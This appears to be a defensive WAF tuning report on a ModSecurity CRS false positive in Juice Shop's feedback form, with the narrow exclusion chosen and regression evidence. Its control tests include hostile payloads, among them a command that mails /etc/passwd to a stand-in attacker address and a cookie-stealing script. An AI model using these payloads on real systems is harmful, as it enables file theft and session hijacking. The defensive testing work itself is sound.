# FP-001 — Tracking link in a feedback comment blocked as command injection

| | |
| --- | --- |
| Status | Fixed, regression-tested |
| Route | `POST /api/Feedbacks/` (Juice Shop "Customer Feedback" form) |
| Rule | CRS 932235 — Unix command injection (command without evasion), CRITICAL |
| Fix | Runtime exclusion **1010** in `modsecurity/exclusions/REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf` |
| Scenarios | `scenarios/false-positive/FP-001.yaml` |

## 1. The legitimate request

A customer reports a typo in a newsletter link and pastes the link:

```json
POST /api/Feedbacks/
{"comment": "The link https://example.com/?ref=juice&utm_source=mail in your newsletter has a typo",
 "rating": 4, "captchaId": 1, "captcha": "12"}
```

Found by probing ~40 realistic feedback comments against CRS PL1; this was the
most natural one that was blocked by a single rule. Others found on the way
(`sleep(8 hours)` → 942160, `javascript:void(0)` → 941170/941210,
`${coupon}` → 932130/933135) are listed at the end.

## 2. Evidence before tuning

[`fp001-before-blocked-932235.json`](../../evidence/sanitized-samples/fp001-before-blocked-932235.json)

```
BLOCKED  status=403  rules=[932235, 949110]  inbound_score=5
932235: Remote Command Execution: Unix Command Injection (command without evasion)
        Matched Data: =mail  found within ARGS:comment: The link https://example.com/?ref=juice&utm_source=mail in your ...
949110: Inbound Anomaly Score Exceeded (Total Score: 5)
980170: ... RCE=5 ... COMBINED_SCORE=5
```

## 3. Why the match is understandable

932235 looks for *prefix + known command + delimiter*
(see the [autopsy](../crs-rule-autopsies/932235.md)). In `utm_source=mail in`:
`=` is a shell-assignment prefix, `mail` is a Unix command, the space is a
delimiter. In a shell parameter, `=mail ` really can be the start of an
injection. In a customer's sentence it is a URL.

## 4. Classifying the problem

| Question from the project report | Answer |
| --- | --- |
| Wrong rule for this application? | No — Juice Shop has command-injection-shaped risks elsewhere. |
| Correct rule, wrong parameter? | **Yes** — `comment` is free text that is stored and displayed, never executed. |
| Correct detection, wrong route? | Partly — only the feedback route takes free text in `comment`. |
| Normalisation issue? | No — `t:none`; the raw text matches. |
| Anomaly threshold issue? | No — one CRITICAL match; raising the threshold would disable many real detections (see [anomaly-scoring experiment](../anomaly-scoring-experiment.md)). |
| Application should change? | No. |

## 5. Options considered

| Option | Effect | Verdict |
| --- | --- | --- |
| `SecRuleRemoveById 932235` | Rule gone for every argument, cookie and route | Too broad |
| `SecRuleUpdateTargetById 932235 "!ARGS:comment"` (configure-time) | Rule ignores `comment` on **every** route | Broader than needed |
| Threshold 5 → 10 | Fixes this and lets every 5-point attack through | Rejected |
| **Runtime exclusion: POST + `/api/Feedbacks` → `ctl:ruleRemoveTargetById=932235;ARGS:comment`** | One rule, one argument, one route | **Chosen** |

## 6. The change

```apache
SecRule REQUEST_METHOD "@streq POST" \
    "id:1010,phase:1,pass,nolog,t:none,ver:'wfr/FP-001',chain"
    SecRule REQUEST_FILENAME "@rx ^/api/feedbacks/?$" \
        "t:none,t:lowercase,ctl:ruleRemoveTargetById=932235;ARGS:comment"
```

It is a **runtime** exclusion, so it lives in the file loaded **before** CRS:
`ctl:` changes how *later* rules treat *this* transaction. Phase 1 is early
enough because 932235 runs in phase 2.

## 7. Evidence after tuning

| Scenario | Request | Result |
| --- | --- | --- |
| FP-001 | the same comment | **allowed**, HTTP 201, no rule matched ([`fp001-after-allowed.json`](../../evidence/sanitized-samples/fp001-after-allowed.json)) |
| FP-001-CTRL-1 | `nice; cat /etc/passwd \| mail attacker@example.test` in `comment` | **blocked**, 930120 + 932160, score 10 ([sample](../../evidence/sanitized-samples/fp001-after-ctrl1-cmdi-still-blocked.json)). Before the fix 932235 also matched (score 15); other rules still catch it. |
| FP-001-CTRL-2 | `<script>…document.cookie</script>` in `comment` | **blocked**, 941100/941110/941160/941180, score 20 |
| FP-001-CTRL-3 | `=mail -s pwned` in another parameter | 932235 still matches |
| FP-001-CTRL-4 | the FP-001 comment sent to `/api/Complaints/` | **still blocked** by 932235 — the exclusion is route-scoped |

All five are in CI.

## 8. Trade-off accepted

On this one route, a command injection whose **only** signal is
`<prefix><command><delimiter>` in `comment` is no longer scored by 932235.
Payloads that also touch files, pipes or other command forms are still caught
(CTRL-1). The field is not passed to a shell by the application.
